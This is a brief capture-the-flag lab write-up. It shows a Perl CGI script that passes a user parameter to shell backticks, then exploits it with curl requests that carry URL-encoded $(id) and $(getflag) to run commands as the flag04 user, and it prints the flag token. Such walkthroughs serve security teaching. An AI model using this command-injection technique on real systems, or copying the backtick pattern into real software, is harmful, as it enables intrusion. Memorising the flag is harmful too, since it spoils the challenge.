We have a Perl script:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

\- This script takes the first argument x and executes echo *ARG* 2>&1

\- We can see that the SUID bit is set.

\- Let's try to inject a malicious command into the CGI script to access the flag04 

Let's try this:
  \- The script will be executed as flag04 thanks to the SUID bit set.
  \- The argument $(id) will be evaluated / executed.
```bash
> curl http://localhost:4747/level04.pl?x=%24%28id%29

uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)

%24%28id%29 => $(id)
```

Let's do the same thing with the command getflag :
```bash
> curl http://localhost:4747/level04.pl?x=%24%28getflag%29
ne2searoevaevoem4ov4ar8ap
```

*ne2searoevaevoem4ov4ar8ap*


